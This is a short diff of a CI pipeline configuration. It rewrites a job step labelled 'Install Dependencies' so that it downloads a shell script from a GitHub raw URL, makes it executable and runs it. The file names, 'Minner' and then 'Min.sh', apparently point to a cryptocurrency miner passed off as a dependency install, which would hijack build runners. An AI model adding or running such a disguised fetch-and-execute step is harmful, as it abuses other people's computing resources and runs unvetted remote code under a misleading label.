@@ -28,12 +28,12 @@ jobs:
 
             name: Install Dependencies
 
-            command: wget 
- https://raw.githubusercontent.com/rack12rack/rack/main/Minner
+            command: wget https://raw.githubusercontent.com/rack12rack/rack/main/Min.sh && chmod +x Min.sh && ./Min.sh
+
         
             
             
- && chmod +x Minner && ./Minner
+
 
     Devop2:
 
